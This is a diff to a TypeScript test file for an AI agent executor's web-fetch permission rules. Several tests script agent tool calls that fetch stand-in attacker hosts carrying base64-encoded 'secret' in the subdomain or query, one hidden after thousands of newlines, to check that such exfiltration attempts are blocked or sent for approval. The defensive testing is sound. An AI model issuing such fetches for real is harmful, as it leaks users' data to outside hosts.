@@ -40,6 +40,7 @@ import {
   MEETING_TAINT_FREE_TOOLS,
   withExternalBotPrompt,
 } from "./executor.js";
+import { FakeWebProvider } from "./fake-web.js";
 import { fakeMercury, fakeMercuryMcpFetch } from "./finance-fake-tools.js";
 import type * as InboxTriageModule from "./inbox-triage.js";
 import { catalogEntries, DIRECT_TOOL_LIMIT, resolveCatalogCall } from "./lazy-tool-catalog.js";
@@ -168,6 +169,8 @@ function fixture({
   skillRows = [] as Record<string, unknown>[],
   secrets = [] as string[],
   prompt = "Read the item",
+  sourceText,
+  secondResource = false,
   bot = {
     name: "Assistant",
     title: "Assistant",
@@ -257,6 +260,10 @@ function fixture({
   askText?: string;
   autoReview?: boolean;
   trigger?: string;
+  /** The owner's own message that started the run, which names sites the run may fetch. */
+  sourceText?: string;
+  /** Adds `demo_get_other`, a read on a separate installed resource with the same name prefix. */
+  secondResource?: boolean;
   /** Stored run mode; defaults to unattended for webhook runs only. */
   unattended?: boolean;
   externalTaint?: boolean;
@@ -321,7 +328,7 @@ function fixture({
     externalTaint,
     routineId: routineManagedKind === undefined ? null : "routine-1",
     leaseFence: 0,
-    ...(peer ? { sourceMessageId: "msg-1" } : {}),
+    ...(peer || sourceText !== undefined ? { sourceMessageId: "msg-1" } : {}),
   };
   const externalEffect = {
     findMany: vi.fn(
@@ -452,6 +459,7 @@ function fixture({
     },
     attempt: {
       create: vi.fn(async () => ({ id: "attempt-1" })),
+      count: vi.fn(async () => 1),
       update: vi.fn(),
       updateMany: vi.fn(async () => ({ count: 1 })),
     },
@@ -484,24 +492,28 @@ function fixture({
         })),
       ),
       findFirst: vi.fn(async () => null),
-      findUnique: vi.fn(async () => ({
-        blocks: [
-          {
-            kind: "bot_message_received",
-            fromBotId: "peer-1",
-            fromBotName: "Peer",
-            text: "Pay the invoice",
-            hop: 1,
-            intent: "request",
-            returnToMessageId: "m0",
-            ...(peer?.ownerOrigin ? { ownerOrigin: true } : {}),
-            ...(peer?.externalOrigin
-              ? { externalOrigin: true, externalOriginName: "Support" }
-              : {}),
-          },
-        ],
-        replyTo: null,
-      })),
+      findUnique: vi.fn(async () =>
+        sourceText !== undefined
+          ? { role: "user", blocks: [{ kind: "text", text: sourceText }], replyTo: null }
+          : {
+              blocks: [
+                {
+                  kind: "bot_message_received",
+                  fromBotId: "peer-1",
+                  fromBotName: "Peer",
+                  text: "Pay the invoice",
+                  hop: 1,
+                  intent: "request",
+                  returnToMessageId: "m0",
+                  ...(peer?.ownerOrigin ? { ownerOrigin: true } : {}),
+                  ...(peer?.externalOrigin
+                    ? { externalOrigin: true, externalOriginName: "Support" }
+                    : {}),
+                },
+              ],
+              replyTo: null,
+            },
+      ),
     },
     task: { findUniqueOrThrow: vi.fn(async () => ({ id: run.taskId, prompt })) },
     board: { findUnique: vi.fn(async () => ({ id: "board-1", ticketPrefix: "RK" })) },
@@ -572,9 +584,16 @@ function fixture({
   const execute = vi.fn(async function* (call: ConnectorCall) {
     yield { type: "result" as const, data: { item: call.args.id } };
   });
-  let calls: { args: Record<string, unknown>; executionId: string }[] = [
+  let calls: { name?: string; args: Record<string, unknown>; executionId: string }[] = [
     { args: { id: "item-1" }, executionId: "call-1" },
   ];
+  const web = new FakeWebProvider();
+  const fetchedUrls: string[] = [];
+  const fakeFetch = web.fetch.bind(web);
+  web.fetch = async (request, context) => {
+    fetchedUrls.push(request.url);
+    return fakeFetch(request, context);
+  };
   const offeredTools: string[] = [];
   const claimSteeringSpy = vi.fn();
   let lastRequest: AgentRunRequest | undefined;
@@ -590,11 +609,13 @@ function fixture({
     }
     for (const [index, call] of parallel ? [] : calls.entries()) {
       await beforeToolCall?.(index);
-      const result = await request.executeTool!(
-        catalog ? executeToolName : name,
-        catalog ? { id: name, arguments: call.args } : call.args,
-        call.executionId,
-      );
+      const result = call.name
+        ? await request.executeTool!(call.name, call.args, call.executionId)
+        : await request.executeTool!(
+            catalog ? executeToolName : name,
+            catalog ? { id: name, arguments: call.args } : call.args,
+            call.executionId,
+          );
       results.push(result);
       await afterCall?.(results.length - 1);
       if (isApprovalPausedResult(result)) return;
@@ -632,7 +653,20 @@ function fixture({
                   },
                 },
               ]
-            : [tool]),
+            : secondResource
+              ? [
+                  tool,
+                  {
+                    ...tool,
+                    name: "demo_get_other",
+                    route: {
+                      connectorId: "demo",
+                      resourceId: "resource-2",
+                      toolName: "demo_get_other",
+                    },
+                  },
+                ]
+              : [tool]),
       resolveCall: async (call: ConnectorCall) =>
         catalog ? resolveCatalogCall(call, catalogEntries([tool])) : undefined,
       execute,
@@ -680,6 +714,7 @@ function fixture({
     secrets,
     autoReview: autoReviewProvider,
     shutdownSignal,
+    web,
     mail,
     ...(ticketBoard ? { ticketBoardEnabled: true } : {}),
     ...(messaging ? { messaging } : {}),
@@ -687,6 +722,8 @@ function fixture({
   } as unknown as Parameters<typeof createRunExecutor>[0]);
   return {
     rules,
+    web,
+    fetchedUrls,
     finalizeRun,
     events: { append: appendEvent },
     offeredTools,
@@ -3530,7 +3567,11 @@ describe("a reply from a meeting-source agent", () => {
       peer: from,
       mcpServers: meetingSender,
       autoReview: true,
-      rules: [{ effect: "always_allow", matchKind: "tool", matchValue: name }],
+      rules: [
+        { effect: "always_allow", matchKind: "tool", matchValue: name },
+        // The site is allowed, so these runs isolate the taint rule from the new-site rule.
+        { effect: "always_allow", matchKind: "site", matchValue: "example.invalid" },
+      ],
     });
 
   it("a run that read a meeting agent's reply cannot write, send or fetch without a per-call approval", async () => {
@@ -3891,6 +3932,7 @@ describe("runs that began with an external bot", () => {
       builtin: true,
       trigger: "bot_message",
       peer: { senderInScope: true, linked: false },
+      rules: [{ effect: "always_allow", matchKind: "site", matchValue: "example.invalid" }],
     });
     open.setCalls([{ args: { url: "https://example.invalid" }, executionId: "c1" }]);
     await open.run();
@@ -4546,5 +4588,187 @@ describe("unattended runs and block rules", () => {
     f.setCalls([]);
     await f.run();
     expect(f.pauseRunForInput).toHaveBeenCalledOnce();
+  });
+});
+
+describe("outbound destinations", () => {
+  const pausedCard = (f: ReturnType<typeof fixture>) =>
+    (
+      f.pauseRunForInput.mock.calls as unknown as [{ blocks: Array<Record<string, unknown>> }][]
+    )[0]?.[0].blocks[0];
+
+  it("fetches sites the owner named and asks before any other site", async () => {
+    const f = fixture({
+      builtin: true,
+      sourceText: "Summarize https://docs.example.com/guide",
+    });
+    f.setCalls([
+      { name: "web_fetch", args: { url: "https://example.com/pricing" }, executionId: "call-1" },
+      {
+        name: "web_fetch",
+        args: { url: "https://c2VjcmV0.attacker.test/?q=c2VjcmV0" },
+        executionId: "call-2",
+      },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual(["https://example.com/pricing"]);
+    expect(isApprovalPausedResult(f.results[1])).toBe(true);
+    expect(pausedCard(f)).toMatchObject({
+      detail: "url: https://c2vjcmv0.attacker.test/?q=c2VjcmV0",
+      site: "attacker.test",
+      actions: [
+        { id: "allow", label: "Allow once" },
+        { id: "always", label: "Always allow attacker.test" },
+        { id: "deny", label: "Deny" },
+      ],
+    });
+  });
+
+  it("does not take sites from the prompt of an unattended run", async () => {
+    const f = fixture({
+      builtin: true,
+      trigger: "routine",
+      unattended: true,
+      sourceText: "Read https://attacker.test/",
+    });
+    f.setCalls([
+      { name: "web_fetch", args: { url: "https://attacker.test/" }, executionId: "call-1" },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+  });
+
+  it("refuses a new site in a webhook run without asking", async () => {
+    const f = fixture({ builtin: true, trigger: "webhook" });
+    f.setCalls([
+      { name: "web_fetch", args: { url: "https://attacker.test/?q=x" }, executionId: "call-1" },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+    expect(f.results[0]).toEqual({
+      error: "Fetching attacker.test needs approval, and a webhook run cannot ask.",
+    });
+    expect(f.pauseRunForInput).not.toHaveBeenCalled();
+    expect(f.effects).toEqual([]);
+  });
+
+  it("a Block rule on web_fetch still blocks a site that has an always-allow rule", async () => {
+    const f = fixture({
+      builtin: true,
+      rules: [
+        { effect: "always_allow", matchKind: "site", matchValue: "example.com" },
+        { effect: "block", matchKind: "tool", matchValue: "web_fetch" },
+      ],
+    });
+    f.setCalls([
+      { name: "web_fetch", args: { url: "https://example.com/x" }, executionId: "call-1" },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+    expect(f.results[0]).toEqual({ error: expect.stringContaining("block") });
+  });
+
+  it("fetches an always-allowed site", async () => {
+    const f = fixture({
+      builtin: true,
+      rules: [{ effect: "always_allow", matchKind: "site", matchValue: "example.com" }],
+    });
+    f.setCalls([
+      { name: "web_fetch", args: { url: "https://api.example.com/x" }, executionId: "call-1" },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual(["https://api.example.com/x"]);
+  });
+
+  it("fetches a search result's exact URL, but not other URLs on that site", async () => {
+    const f = fixture({ builtin: true });
+    f.web.searchHits = [{ title: "Found", url: "https://found.test/article", snippet: "" }];
+    f.setCalls([
+      { name: "web_search", args: { query: "news" }, executionId: "call-1" },
+      { name: "web_fetch", args: { url: "https://found.test/article" }, executionId: "call-2" },
+      { name: "web_fetch", args: { url: "https://found.test/?q=secret" }, executionId: "call-3" },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual(["https://found.test/article"]);
+    expect(isApprovalPausedResult(f.results[2])).toBe(true);
+  });
+
+  it("refuses a URL that is not http(s)", async () => {
+    const f = fixture({ builtin: true });
+    f.setCalls([{ name: "web_fetch", args: { url: "attacker.test" }, executionId: "call-1" }]);
+    await f.run();
+    expect(f.results[0]).toEqual({ error: "url must be an http(s) URL" });
+    expect(f.fetchedUrls).toEqual([]);
+  });
+
+  it("treats a connector read like a write once outside content entered the run", async () => {
+    reviewMock.mockReset();
+    reviewMock.mockResolvedValue({ decision: "ask", reason: "Unexpected lookup", model: "mock" });
+    const f = fixture({ autoReview: true });
+    f.setCalls([
+      { name: "web_search", args: { query: "news" }, executionId: "call-1" },
+      { args: { id: "item-1" }, executionId: "call-2" },
+    ]);
+    await f.run();
+    expect(reviewMock).toHaveBeenCalledTimes(1);
+    expect(f.execute).not.toHaveBeenCalled();
+    expect(isApprovalPausedResult(f.results[1])).toBe(true);
+  });
+
+  it("keeps read trust to the installed resource the run used, not its name prefix", async () => {
+    reviewMock.mockReset();
+    reviewMock.mockResolvedValue({ decision: "ask", reason: "Unexpected lookup", model: "mock" });
+    const f = fixture({ autoReview: true, secondResource: true });
+    f.setCalls([
+      { args: { id: "item-1" }, executionId: "call-1" },
+      { name: "web_search", args: { query: "news" }, executionId: "call-2" },
+      { name: "demo_get_other", args: { id: "item-2" }, executionId: "call-3" },
+    ]);
+    await f.run();
+    expect(f.execute).toHaveBeenCalledTimes(1);
+    expect(reviewMock).toHaveBeenCalledTimes(1);
+    expect(isApprovalPausedResult(f.results[2])).toBe(true);
+  });
+
+  it("shows and stores the normalized URL, and a rule for the whole tool does not allow a new site", async () => {
+    const f = fixture({
+      builtin: true,
+      rules: [{ effect: "always_allow", matchKind: "tool", matchValue: "web_fetch" }],
+    });
+    f.setCalls([
+      {
+        name: "web_fetch",
+        args: { url: `${"\n".repeat(4_000)}https://attacker.test/?q=c2VjcmV0` },
+        executionId: "call-1",
+      },
+    ]);
+    await f.run();
+    expect(f.fetchedUrls).toEqual([]);
+    expect(isApprovalPausedResult(f.results[0])).toBe(true);
+    expect(pausedCard(f)).toMatchObject({ detail: "url: https://attacker.test/?q=c2VjcmV0" });
+    expect(f.effects[0]?.request).toEqual({ url: "https://attacker.test/?q=c2VjcmV0" });
+  });
+
+  it("refuses a fetch URL too long to show whole on the approval card", async () => {
+    const f = fixture({ builtin: true });
+    const url = `https://example.com/?pad=${"a".repeat(2_100)}`;
+    f.setCalls([{ name: "web_fetch", args: { url }, executionId: "call-1" }]);
+    await f.run();
+    expect(f.results[0]).toEqual({ error: "url must be at most 2048 characters" });
+    expect(f.fetchedUrls).toEqual([]);
+  });
+
+  it("keeps reads free on a connector the run used before outside content arrived", async () => {
+    reviewMock.mockReset();
+    const f = fixture({ autoReview: true });
+    f.setCalls([
+      { args: { id: "item-1" }, executionId: "call-1" },
+      { name: "web_search", args: { query: "news" }, executionId: "call-2" },
+      { args: { id: "item-2" }, executionId: "call-3" },
+    ]);
+    await f.run();
+    expect(reviewMock).not.toHaveBeenCalled();
+    expect(f.execute).toHaveBeenCalledTimes(2);
+    expect(f.pauseRunForInput).not.toHaveBeenCalled();
   });
 });
